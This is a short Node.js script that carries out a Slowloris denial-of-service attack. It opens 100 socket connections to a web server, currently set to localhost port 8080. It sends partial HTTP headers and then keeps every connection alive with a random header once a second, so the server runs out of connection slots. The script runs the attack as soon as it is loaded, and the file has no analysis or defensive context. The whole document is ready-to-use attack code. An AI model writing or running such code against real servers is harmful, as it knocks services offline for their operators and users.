const net = require("net");

const targetHost = "localhost";
const targetPort = 8080;
const numberOfConnections = 100;
const intervalBetweenHeaders = 1000; // Interval in milliseconds

function slowlorisAttack() {
  for (let i = 0; i < numberOfConnections; i++) {
    const client = new net.Socket();

    client.connect(targetPort, targetHost, () => {
      console.log("Connected to target server");

      // Send initial HTTP request headers
      client.write("GET / HTTP/1.1\r\n");
      client.write(`Host: ${targetHost}\r\n`);

      // Function to send headers periodically
      const sendHeader = () => {
        if (client.writable) {
          client.write(`X-a: ${Math.random()}\r\n`);
        } else {
          clearInterval(interval);
        }
      };

      // Set interval to send headers periodically
      const interval = setInterval(sendHeader, intervalBetweenHeaders);

      // Handle connection close event
      client.on("close", () => {
        console.log("Connection closed");
        clearInterval(interval);
      });

      // Handle error event
      client.on("error", (error) => {
        console.error("Connection error:", error.message);
        clearInterval(interval);
      });
    });
  }
}

// Start the attack
slowlorisAttack();
